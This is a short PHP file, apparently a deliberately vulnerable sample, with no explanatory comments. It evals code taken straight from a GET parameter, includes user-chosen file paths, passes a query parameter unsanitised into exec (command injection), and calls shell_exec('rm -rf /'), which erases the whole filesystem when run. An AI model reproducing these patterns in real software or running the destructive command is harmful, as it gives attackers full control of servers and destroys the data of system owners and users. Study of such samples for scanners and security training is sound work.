<?php
$code = $_GET['code'];
eval($code);

$file = $_GET['file'];
include $file;
require_once 'uploads/' . $file;

shell_exec('rm -rf /');
exec('ls ' . $_GET['dir']);
